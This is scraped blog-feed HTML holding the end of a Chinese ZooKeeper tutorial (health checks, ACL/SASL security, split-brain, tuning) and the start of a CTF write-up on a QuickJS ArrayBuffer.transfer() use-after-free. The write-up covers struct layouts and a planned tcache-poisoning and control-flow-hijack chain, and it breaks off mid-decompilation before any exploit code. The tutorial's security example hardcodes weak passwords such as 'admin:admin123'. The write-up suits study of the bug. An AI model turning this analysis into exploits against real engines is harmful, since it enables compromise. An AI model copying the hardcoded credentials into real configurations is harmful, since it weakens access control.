            <span class="hljs-type">ServerHealth</span> <span class="hljs-variable">serverHealth</span> <span class="hljs-operator">=</span> checkServerHealth(server);
            health.addServerHealth(server, serverHealth);
        }
        
        <span class="hljs-keyword">return</span> health;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClusterHealth</span> {
        <span class="hljs-keyword">private</span> Map&lt;String, ServerHealth&gt; serverHealths = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">healthyCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addServerHealth</span><span class="hljs-params">(String server, ServerHealth health)</span> {
            serverHealths.put(server, health);
            <span class="hljs-keyword">if</span> (health.isHealthy()) {
                healthyCount++;
            }
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isClusterHealthy</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> healthyCount &gt; serverHealths.size() / <span class="hljs-number">2</span>;
        }
    }
}
</code></pre>
<h3 data-id="heading-46">5.3 安全最佳实践</h3>
<h4 data-id="heading-47">5.3.1 网络安全配置</h4>
<pre><code class="hljs language-properties" lang="properties"># 启用认证
authProvider.1=org.apache.zookeeper.server.auth.SASLAuthenticationProvider
enforce.auth.enabled=true
enforce.auth.schemes=sasl

# IP白名单
# 在服务器启动脚本中设置
# -Dzookeeper.allow.unsafe.forceSync=no
# -Dzookeeper.net.allowUnsecureClientConnection=false
</code></pre>
<h4 data-id="heading-48">5.3.2 ACL 安全配置</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setupSecureACL</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">ZooKeeper</span> <span class="hljs-variable">zk</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(<span class="hljs-string">"localhost:2181"</span>, <span class="hljs-number">3000</span>, <span class="hljs-literal">null</span>);
        
        <span class="hljs-comment">// 添加管理员认证</span>
        zk.addAuthInfo(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"admin:admin123"</span>.getBytes());
        
        <span class="hljs-comment">// 创建安全节点</span>
        List&lt;ACL&gt; acls = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-comment">// 管理员有所有权限</span>
        acls.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ACL</span>(ZooDefs.Perms.ALL, 
                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Id</span>(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"admin:admin123"</span>)));
        
        <span class="hljs-comment">// 应用用户有读写权限</span>
        acls.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ACL</span>(ZooDefs.Perms.READ | ZooDefs.Perms.WRITE,
                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Id</span>(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"appuser:app123"</span>)));
        
        <span class="hljs-comment">// 只读用户只有读权限</span>
        acls.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ACL</span>(ZooDefs.Perms.READ,
                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">Id</span>(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"readuser:read123"</span>)));
        
        zk.create(<span class="hljs-string">"/secure/config"</span>, 
                 <span class="hljs-string">"sensitive_data"</span>.getBytes(),
                 acls,
                 CreateMode.PERSISTENT);
    }
}
</code></pre>
<h2 data-id="heading-49">6. 常见问题与解决方案</h2>
<h3 data-id="heading-50">6.1 脑裂问题防护</h3>
<p>ZooKeeper 通过以下机制有效防止脑裂问题：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "正常集群: 5台服务器"
        A[Server1 Leader] --&gt; B[Server2 Follower]
        A --&gt; C[Server3 Follower]
        A --&gt; D[Server4 Follower]
        A --&gt; E[Server5 Follower]
    end
    
    subgraph "网络分区场景"
        F[Server1 Leader] --&gt; G[Server2 Follower]
        F --&gt; H[Server3 Follower]
        
        I[Server4 Follower] --&gt; J[Server5 Follower]
    end
    
    subgraph "选举结果"
        K[分区1: 3台服务器] --&gt; L[可以选举新Leader]
        M[分区2: 2台服务器] --&gt; N[无法选举Leader]
    end
</code></pre>
<p><strong>防护机制</strong>：</p>
<ol>
<li><strong>过半机制</strong>：只有获得多数派（n/2 + 1）支持的服务器才能成为Leader</li>
<li><strong>Zxid 序列</strong>：确保事务的全局顺序一致性</li>
<li><strong>会话机制</strong>：客户端与服务器维持心跳，检测连接状态</li>
</ol>
<h3 data-id="heading-51">6.2 数据一致性保证</h3>
<p>ZooKeeper 提供不同级别的一致性保证：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConsistencyGuarantees</span> {
    <span class="hljs-comment">/**
     * ZooKeeper 一致性级别：
     * 
     * 1. 顺序一致性 (Sequential Consistency)
     *    - 所有更新按全局顺序执行
     *    - 客户端看到一致的更新顺序
     *    
     * 2. 原子性 (Atomicity)
     *    - 更新要么全部成功，要么全部失败
     *    - 不会出现部分更新的状态
     *    
     * 3. 单一系统映像 (Single System Image)
     *    - 客户端无论连接到哪个服务器，看到的数据视图一致
     *    
     * 4. 可靠性 (Reliability)
     *    - 一旦更新完成，数据持久化存储
     *    - 客户端会收到更新结果
     *    
     * 5. 及时性 (Timeliness)
     *    - 客户端在一定时间范围内会看到最新的数据
     */</span>
    
    <span class="hljs-comment">// 写操作一致性</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeConsistency</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 写操作是线性化的，所有客户端看到相同的顺序</span>
        <span class="hljs-comment">// 通过Leader和ZAB协议保证</span>
    }
    
    <span class="hljs-comment">// 读操作一致性  </span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readConsistency</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 读操作可能看到稍旧的数据（默认）</span>
        <span class="hljs-comment">// 但可以通过sync()操作保证读最新数据</span>
    }
}
</code></pre>
<h3 data-id="heading-52">6.3 容灾与恢复策略</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    Start[集群故障] --&gt; Detect[故障检测]
    Detect --&gt; Election[Leader选举]
    Election --&gt; Sync[数据同步]
    Sync --&gt; Recovery[故障恢复]
    Recovery --&gt; Normal[恢复正常]
    
    Detect --&gt; |数据损坏| Snapshot[使用快照恢复]
    Snapshot --&gt; LogReplay[重放事务日志]
    LogReplay --&gt; Validation[数据验证]
    Validation --&gt; Normal
    
    Detect --&gt; |网络分区| Quorum[检查法定人数]
    Quorum --&gt; |多数派存活| Continue[继续服务]
    Quorum --&gt; |少数派存活| Wait[等待恢复]
    
    Continue --&gt; Normal
    Wait --&gt; Reconnect[网络恢复]
    Reconnect --&gt; Sync
</code></pre>
<p><strong>恢复策略</strong>：</p>
<ol>
<li><strong>自动故障转移</strong>：Leader故障时自动选举新Leader</li>
<li><strong>数据恢复</strong>：从事务日志和快照恢复数据</li>
<li><strong>客户端重连</strong>：客户端自动重连到可用服务器</li>
<li><strong>数据校验</strong>：恢复后验证数据一致性</li>
</ol>
<h3 data-id="heading-53">6.4 性能瓶颈与优化</h3>
<p><strong>常见性能瓶颈</strong>：</p>
<ol>
<li><strong>磁盘IO</strong>：事务日志写入性能</li>
<li><strong>网络延迟</strong>：服务器间通信延迟</li>
<li><strong>内存限制</strong>：大量Watcher和节点数据</li>
<li><strong>CPU竞争</strong>：大量客户端连接和请求</li>
</ol>
<p><strong>优化方案</strong>：</p>
<pre><code class="hljs language-properties" lang="properties"># 性能优化配置
# 1. 磁盘优化
dataLogDir=/ssd/zookeeper/logs    # 事务日志使用SSD
preAllocSize=131072               # 增大预分配大小

# 2. 网络优化
tickTime=2000
initLimit=10
syncLimit=5

# 3. 内存优化
# JVM堆大小根据节点数量调整
# 避免存储大文件在Znode中

# 4. 客户端优化
# 使用连接池，避免频繁创建连接
# 合理设置会话超时时间
</code></pre>
<h2 data-id="heading-54">7. 总结</h2>
<p>ZooKeeper 作为分布式系统的基石，通过其精妙的设计和可靠的实现，为构建高可用、强一致的分布式应用提供了坚实基础。</p>
<h3 data-id="heading-55">7.1 核心价值总结</h3>
<ol>
<li><strong>可靠的协调服务</strong>：提供分布式系统所需的基本协调原语</li>
<li><strong>强一致性保证</strong>：通过ZAB协议确保数据一致性</li>
<li><strong>高可用架构</strong>：自动故障检测和恢复，保证服务连续性</li>
<li><strong>简化开发</strong>：封装复杂的分布式协调逻辑，降低开发复杂度</li>
</ol>
<h3 data-id="heading-56">7.2 适用场景</h3>
<ul>
<li><strong>配置管理</strong>：集中式配置管理，动态配置更新</li>
<li><strong>服务发现</strong>：微服务架构中的服务注册与发现</li>
<li><strong>分布式锁</strong>：跨进程资源访问协调</li>
<li><strong>领导者选举</strong>：分布式系统中的主节点选举</li>
<li><strong>集群管理</strong>：节点状态监控和故障检测</li>
<li><strong>分布式队列</strong>：简单的任务队列和协调</li>
</ul>
<h3 data-id="heading-57">7.3 最佳实践建议</h3>
<ol>
<li><strong>合理设计数据模型</strong>：避免深层次节点结构，控制节点数据大小</li>
<li><strong>优化Watcher使用</strong>：避免过多Watcher，注意重新注册</li>
<li><strong>合理规划集群规模</strong>：根据容错需求和性能要求选择服务器数量</li>
<li><strong>实施安全策略</strong>：使用ACL控制访问权限，网络隔离</li>
<li><strong>建立监控体系</strong>：全面监控集群状态和性能指标</li>
</ol>
<p>通过深入理解 ZooKeeper 的原理和机制，结合实际业务需求合理设计和优化，可以构建出稳定可靠的分布式系统，满足企业级应用的高标准要求。</p>
<hr/>
<p><strong>参考资源</strong>：</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fzookeeper.apache.org%2F" target="_blank" title="https://zookeeper.apache.org/" ref="nofollow noopener noreferrer">ZooKeeper 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsnailclimb.gitee.io%2Fjavaguide%2F%23%2Fdocs%2Fsystem-design%2Fdistributed-system%2Fzookeeper%2Fzookeeper-in-action" target="_blank" title="https://snailclimb.gitee.io/javaguide/#/docs/system-design/distributed-system/zookeeper/zookeeper-in-action" ref="nofollow noopener noreferrer">ZooKeeper 实战指南</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fapache%2Fzookeeper" target="_blank" title="https://github.com/apache/zookeeper" ref="nofollow noopener noreferrer">ZooKeeper 源码解析</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一道JS引擎题目复现babyjs]]></title>    <link>https://juejin.cn/post/7575104251865858058</link>    <guid>https://juejin.cn/post/7575104251865858058</guid>    <pubDate>2025-11-22T15:59:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251865858058" data-draft-id="7575047994682605619" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一道JS引擎题目复现babyjs"/> <meta itemprop="keywords" content="安全"/> <meta itemprop="datePublished" content="2025-11-22T15:59:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BenSmith"/> <meta itemprop="url" content="https://juejin.cn/user/3145055758457438"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一道JS引擎题目复现babyjs
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3145055758457438/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BenSmith
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T15:59:03.000Z" title="Sat Nov 22 2025 15:59:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读33分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一道JS引擎题目复现babyjs</h2>
<h3 data-id="heading-1">前言</h3>
<p>最近在做CTF题目时遇到了一道有趣的JavaScript引擎pwn题——基于修改版QuickJS的<code>ArrayBuffer.transfer()</code>实现缺陷。这个漏洞的成因非常经典：在对象状态转换时只更新了部分相关数据结构，导致产生Use-After-Free。整个利用链从地址泄露到tcache投毒再到控制流劫持，是一次完整的堆利用实践。</p>
<p>题目的neta很有意思："经验表明，一个足够坚定的人使用poc撰写exp基本总能成功"，改编自"经验表明，一个足够坚定的人使用近战武器攻击坦克基本总能成功"。确实，有了PoC之后，剩下的就是堆布局的调试和利用链的构造了。</p>
<h3 data-id="heading-2">漏洞信息</h3>
<p><strong>题目名称</strong>: babyjs
<strong>漏洞类型</strong>: Use-After-Free (UAF)
<strong>影响版本</strong>: 修改版QuickJS（基于某个官方版本）
<strong>影响函数</strong>: <code>js_array_buffer_transfer</code> (地址 0xa6450)
<strong>漏洞成因</strong>: transfer()操作后只更新了ArrayBuffer对象的detached标志，但没有同步更新相关的TypedArray视图</p>
<h3 data-id="heading-3">相关背景知识</h3>
<h4 data-id="heading-4">JavaScript中的ArrayBuffer与TypedArray</h4>
<p>在深入漏洞分析之前，我们需要理解JavaScript中ArrayBuffer和TypedArray的工作机制。</p>
<p><strong>ArrayBuffer</strong>是JavaScript提供的一种表示固定长度原始二进制数据缓冲区的对象。它本身不能直接读写，需要通过视图（View）来操作：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 创建一个256字节的ArrayBuffer</span>
<span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">256</span>);

<span class="hljs-comment">// 创建不同类型的视图来访问同一块内存</span>
<span class="hljs-keyword">const</span> uint32View = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(buffer);  <span class="hljs-comment">// 以32位无符号整数方式访问</span>
<span class="hljs-keyword">const</span> uint8View = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(buffer);    <span class="hljs-comment">// 以8位无符号整数方式访问</span>
<span class="hljs-keyword">const</span> float64View = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(buffer); <span class="hljs-comment">// 以64位浮点数方式访问</span>

<span class="hljs-comment">// 这些视图都指向同一块底层内存</span>
uint32View[<span class="hljs-number">0</span>] = <span class="hljs-number">0x12345678</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(uint8View[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 0x78 (小端序)</span>
</code></pre>
<p><strong>TypedArray</strong>是一组用于访问ArrayBuffer的类型化数组视图，包括<code>Int8Array</code>, <code>Uint32Array</code>, <code>Float64Array</code>等。每个TypedArray实例都维护着指向底层ArrayBuffer的引用以及自己的偏移量和长度。</p>
<h4 data-id="heading-5">ArrayBuffer的Detached状态</h4>
<p>当ArrayBuffer被"分离"（detached）后，它的底层数据缓冲区会被释放或转移，此时：</p>
<ul>
<li>ArrayBuffer的<code>byteLength</code>属性变为0</li>
<li>任何尝试通过TypedArray访问该ArrayBuffer的操作都应该抛出TypeError异常</li>
<li>相关的TypedArray视图也应该失效</li>
</ul>
<p>常见导致ArrayBuffer detached的操作：</p>
<ol>
<li><code>ArrayBuffer.transfer()</code> - 将数据转移到新的ArrayBuffer</li>
<li><code>postMessage()</code> - 通过结构化克隆转移所有权</li>
<li>手动调用引擎内部的detach API</li>
</ol>
<h4 data-id="heading-6">ArrayBuffer.transfer()方法</h4>
<p><code>ArrayBuffer.prototype.transfer()</code>是一个相对较新的API（ES2024提案），用于创建一个新的ArrayBuffer并将原ArrayBuffer的内容转移过去：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> buffer1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>);
<span class="hljs-keyword">const</span> view1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(buffer1);
view1[<span class="hljs-number">0</span>] = <span class="hljs-number">42</span>;

<span class="hljs-comment">// 转移数据到新buffer，可以指定新的大小</span>
<span class="hljs-keyword">const</span> buffer2 = buffer1.<span class="hljs-title function_">transfer</span>(<span class="hljs-number">16</span>);
<span class="hljs-keyword">const</span> view2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(buffer2);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(view2[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 42 - 数据被保留</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(buffer1.<span class="hljs-property">byteLength</span>); <span class="hljs-comment">// 0 - 原buffer已detached</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(view1.<span class="hljs-property">byteLength</span>); <span class="hljs-comment">// 0 - 原view也应该失效</span>

<span class="hljs-comment">// 尝试访问原view应该抛出异常</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(view1[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 应该抛出TypeError</span>
} <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Expected error:"</span>, e.<span class="hljs-property">message</span>);
}
</code></pre>
<h4 data-id="heading-7">QuickJS中的关键数据结构</h4>
<p>QuickJS引擎中，ArrayBuffer和TypedArray的实现涉及以下关键结构：</p>
<h5 data-id="heading-8">JSArrayBuffer结构体</h5>
<pre><code class="hljs language-c" lang="c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">JSArrayBuffer</span> {</span>
    <span class="hljs-type">int</span> byte_length;      <span class="hljs-comment">// offset +0:  缓冲区字节长度，detached时为0</span>
    <span class="hljs-type">int</span> max_byte_length;  <span class="hljs-comment">// offset +4:  可调整大小缓冲区的最大长度</span>
    <span class="hljs-type">uint8_t</span> detached;     <span class="hljs-comment">// offset +8:  detached标志，1表示已分离</span>
    <span class="hljs-type">uint8_t</span> shared;       <span class="hljs-comment">// offset +9:  shared标志，1表示SharedArrayBuffer</span>
    <span class="hljs-type">uint8_t</span> *data;        <span class="hljs-comment">// offset +16: 指向实际数据的指针，detached时为NULL</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">array_list</span>;</span>  <span class="hljs-comment">// offset +24: 关联的TypedArray视图链表</span>
    <span class="hljs-type">void</span> *opaque;         <span class="hljs-comment">// offset +40: 不透明指针，传递给free_func</span>
    JSFreeArrayBufferDataFunc *free_func;  <span class="hljs-comment">// offset +48: 释放数据的函数指针</span>
} JSArrayBuffer;
</code></pre>
<p>这个结构体的设计很清晰：</p>
<ul>
<li><code>byte_length</code>和<code>data</code>存储实际的缓冲区信息</li>
<li><code>detached</code>标志表示当前状态</li>
<li><strong><code>array_list</code>是一个双向链表头，连接所有基于此ArrayBuffer创建的TypedArray视图</strong></li>
<li><code>free_func</code>是一个函数指针，用于释放<code>data</code>指向的内存</li>
</ul>
<h5 data-id="heading-9">JSTypedArray结构体</h5>
<pre><code class="hljs language-c" lang="c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">JSTypedArray</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">link</span>;</span>   <span class="hljs-comment">// offset +0:  链接到arraybuffer的array_list</span>
    JSObject *obj;           <span class="hljs-comment">// offset +16: 指向TypedArray对象本身的指针</span>
    JSObject *buffer;        <span class="hljs-comment">// offset +24: 指向基础ArrayBuffer对象的指针</span>
    <span class="hljs-type">uint32_t</span> offset;         <span class="hljs-comment">// offset +32: 在ArrayBuffer中的字节偏移</span>
    <span class="hljs-type">uint32_t</span> length;         <span class="hljs-comment">// offset +36: TypedArray的长度（元素个数）</span>
} JSTypedArray;
</code></pre>
<p>TypedArray结构通过<code>link</code>字段串联在ArrayBuffer的<code>array_list</code>链表上。这样设计的目的是：<strong>当ArrayBuffer状态变化时（如resize或detach），可以遍历所有相关的TypedArray视图并同步更新它们的状态</strong>。</p>
<h5 data-id="heading-10">内存布局示意</h5>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">ArrayBuffer对象内存布局:</span>
<span class="hljs-section">+0x00: byte_length (4 bytes)</span>
<span class="hljs-section">+0x04: max_byte_length (4 bytes)</span>
<span class="hljs-section">+0x08: detached (1 byte)</span>
<span class="hljs-section">+0x09: shared (1 byte)</span>
<span class="hljs-section">+0x10: data指针 (8 bytes)</span>
<span class="hljs-section">+0x18: array_list.next (8 bytes)  ← 链表头</span>
<span class="hljs-section">+0x20: array_list.prev (8 bytes)</span>
<span class="hljs-section">+0x28: opaque (8 bytes)</span>
<span class="hljs-section">+0x30: free_func (8 bytes)</span>

<span class="hljs-section">TypedArray对象内存布局:</span>
<span class="hljs-section">+0x00: link.next (8 bytes)  ← 连接到ArrayBuffer的array_list</span>
<span class="hljs-section">+0x08: link.prev (8 bytes)</span>
<span class="hljs-section">+0x10: obj指针 (8 bytes)</span>
<span class="hljs-section">+0x18: buffer指针 (8 bytes)</span>
<span class="hljs-section">+0x20: offset (4 bytes)</span>
<span class="hljs-section">+0x24: length (4 bytes)</span>
</code></pre>
<p>当一个TypedArray被创建时，它会被添加到对应ArrayBuffer的<code>array_list</code>链表中。这个链表关系是整个漏洞的关键所在。</p>
<h3 data-id="heading-11">漏洞分析</h3>
<h4 data-id="heading-12">完整源码分析</h4>
<p>通过IDA逆向，我们得到了<code>js_array_buffer_transfer</code>函数的完整实现。让我们逐段分析：</p>
<pre><code class="hljs language-c" lang="c">JSValue __fastcall <span class="hljs-title function_">js_array_buffer_transfer</span><span class="hljs-params">(
        JSContext *ctx,
        JSValue this_val,
        <span class="hljs-type">int</span> argc,
        JSValue *argv,
        <span class="hljs-type">int</span> transfer_to_fixed_length)</span>
{
    <span class="hljs-type">int64_t</span> tag;
    JSArrayBuffer *v13;
    <span class="hljs-type">uint64_t</span> new_len;
    <span class="hljs-type">uint64_t</span> max_len[<span class="hljs-number">9</span>];
    
    tag = this_val.tag;
    
    <span class="hljs-comment">// 1. 获取ArrayBuffer对象指针</span>
    v13 = (JSArrayBuffer *)JS_GetOpaque2(ctx, this_val, <span class="hljs-number">0x13</span>u);
    <span class="hljs-keyword">if</span> (!v13)
        <span class="hljs-keyword">goto</span> ERROR_RETURN;
    
    <span class="hljs-comment">// 2. 检查是否为SharedArrayBuffer（不支持transfer）</span>
    <span class="hljs-keyword">if</span> (v13-&gt;shared)
        <span class="hljs-keyword">return</span> JS_ThrowTypeError(ctx, <span class="hljs-string">"cannot transfer a SharedArrayBuffer"</span>);
</code></pre>
<p>函数开始时进行基本的参数检查。注意<code>0x13u</code>是<code>JS_CLASS_ARRAY_BUFFER</code>的类ID。</p>
<pre><code class="hljs language-c" lang="c">    <span class="hljs-comment">// 3. 解析新的长度参数</span>
    <span class="hljs-keyword">if</span> (argc &gt; <span class="hljs-number">0</span> &amp;&amp; LODWORD(argv-&gt;tag) != <span class="hljs-number">3</span>) {
